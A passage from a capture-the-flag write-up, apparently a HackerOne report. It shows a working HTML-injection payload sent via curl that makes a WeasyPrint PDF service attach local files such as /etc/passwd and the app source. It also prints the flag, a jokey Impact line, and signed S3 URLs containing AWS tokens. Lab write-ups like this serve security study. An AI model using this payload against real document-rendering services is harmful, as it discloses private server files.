 Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 19735  100 19735    0     0  44649      0 --:--:-- --:--:-- --:--:-- 44649\n```\n\nThe attachment won't be visible directly in the document and since my PDF viewer didn't support extraction of attachments, I used `pdftk` to extract the attachments.\n\n```\nroot@pwnbox16:~/files/pdfhack# pdftk out.pdf unpack_files\n\nroot@pwnbox16:~/files/pdfhack# ls -l\ntotal 24\n-rw-rw-r-- 1 root root 19735 Mar  3 08:40 out.pdf\n-rw-r--r-- 1 root root  1020 Mar  3 08:43 passwd\n\nroot@pwnbox16:~/files/pdfhack# cat passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n```\n\nLooks like we have a full LFD :)\n\nLet's try leaking the source code of webapp. Judging from the previous docker instance, the source should be in `/app/main.py`\n\n```\nroot@pwnbox16:~/files/pdfhack# curl -g --proxy socks5h://localhost:6666 'http://172.19.0.3/invoices/pdfize?d={\"companyName\":\"Acme Tools\",\"email\":\"accounting@acme.com\",\"invoiceNumber\":\"0001\",\"date\":\"2019-04-01\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"background-color:white}\u003c/sty\u003c/stystylele\u003ele\u003e\u003clink rel=\\\"attachment\\\" href=\\\"file:///app/main.py\\\"\u003e\":\"white\"}}}'  -o out2.pdf\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 20846  100 20846    0     0  46844      0 --:--:-- --:--:-- --:--:-- 46739\n\nroot@pwnbox16:~/files/pdfhack# pdftk out2.pdf unpack_files\nroot@pwnbox16:~/files/pdfhack# cat main.py\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n\nfrom flask import Flask, abort, redirect, render_template, request, Response\nfrom jinja2 import Template\nfrom weasyprint import HTML\nimport base64, json, os, random, re\n\napp = Flask(__name__)\n\u003csnip\u003e...\n```\n\nLooking at the rest of the source, I realized I dodged a fuckin bulldozer by not messing with the login...\n\n```python\n@app.route('/auth', methods=['GET', 'POST'])\ndef auth(page=None):\n\terror = None\n\tif request.method == 'POST':\n\t\tpassword = request.form['password']\n\t\terror = makeSqlError(password)\n\t\tif error is False or (\"'\" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):\n\t\t\traise Exception('SQL Error')\n\treturn render('login', page=page or 'login', error=error)\n\ndef makeSqlError(password):\n\tpassword = \"'\" + password + \"'\"\n\tquotes = 0\n\tescape = False\n\tnonquoted = ''\n\tfor c in password:\n\t\tif escape:\n\t\t\tescape = False\n\t\telif c == '\\\\':\n\t\t\tescape = True\n\t\telif c == '\\'':\n\t\t\tquotes += 1\n\t\telif (quotes \u0026 1) == 0:\n\t\t\tnonquoted += c\n\n\tif (quotes \u0026 1) != 0:\n\t\treturn False\n\telif ' OR ' in nonquoted:\n\t\treturn 'Invalid password'\n\telif 'UNION' in nonquoted:\n\t\treturn 'Invalid username'\n\treturn 'Invalid username or password\n```\n\nTHAT IS SO EVIL. I definitely wouldn't have enjoyed going down that rabbit hole...\n\nSo getting the source of `main.py` marked the end of the CTF. The flag is `c8889970d9fb722066f31e804e351993`\n\nOverall, it was pretty good except the advanced guessing parts. This was a team effort by me and @corb3nik.\n\n## Impact\n\nCyber quantum blockchain RCE with AI","original_report_id":null,"original_report_url":null,"attachments":[{"id":434370,"file_name":"s1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/370/52a22ae26315968b5f59c54f462606054f834b83/s1.png?response-content-disposition=attachment%3B%20filename%3D%22s1.png%22%3B%20filename%2A%3DUTF-8%27%27s1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1c47b289f812b18b0cd932e61025d5fa6020fc00ba2201ab878da5753314e926","file_size":371815,"type":"image/png"},{"id":434392,"file_name":"Selection_200.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/392/038135f9aecbeaf6528a2cfe3bd35ce13f9a7d6c/Selection_200.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_200.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_200.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=222e378ff1a38d3168bdac7f44fa258ca3d7ee9e7a79d9a8807a6f27fd4685f7","file_size":68663,"type":"image/png"},{"id":434393,"file_name":"Selection_201.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/393/8cef772df6a7392eeefbe579ed73c7f55adc4c62/Selection_201.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_201.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_201.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=68734f729cd02d6e69de30a0ffc65801c95d58ca4a7d232478a5999b4f49d48f","file_size":126862,"type":"image/png"},{"id":434420,"file_name":"Selection_202.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/420/bc609ad76fcec9c219c5f7f94422a3a3fc5fa764/Selection_202.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_202.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_202.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3efc9692d90e6efee7daa7022424dd68ee1a9b20540fbbddb22a25fdaafa8c3e","file_size":95118,"type":"image/png"},{"id":434443,"file_name":"Selection_203.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/443/175464f5da895a913802bd9018cb5f87ece64fdd/Selection_203.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_203.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_203.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=74cc0e00a7a6a5ca037b46812f5d1a9918ee3e681be4aefb5c2a2390cfe9643c","file_size":11859,"type":"image/png"},{"id":434454,"file_name":"Selection_204.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/454/015bcbe7434144afe559a369b19f063a31bce110/Selection_204.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_204.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_204.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dac1514599eb14bf019be020a8d75e7fc65cffb6fc7311fc08534dc4ecf892e4","file_size":11758,"type":"image/png"},{"id":434469,"file_name":"Selection_205.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/469/8eefa704667c57410e834ebc5afaa1f6699f0ea4/Selection_205.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_205.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_205.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=37d97ac7f5e2cd322e13d8737b537cff98d70c8f2e857e13c3d560d7ac094393","file_size":14939,"type":"image/png"},{"id":434477,"file_name":"Selection_207.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/477/fcb1e9a94b1ec6a38cf179bacab8575faac84a33/Selection_207.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_207.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_207.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150706Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a367fce0d6b0ea9975ad33aa94241e6cfe5ef2cd69b8d4790717a675aba4c4ec","file_size":17592,"type":"image/png"},{"id":434479,"file_name":"Selection_208.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/479/83b20fc2726b84d6349ed2bfacc59f86f4815032/Selection_208.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_208.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_208.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=202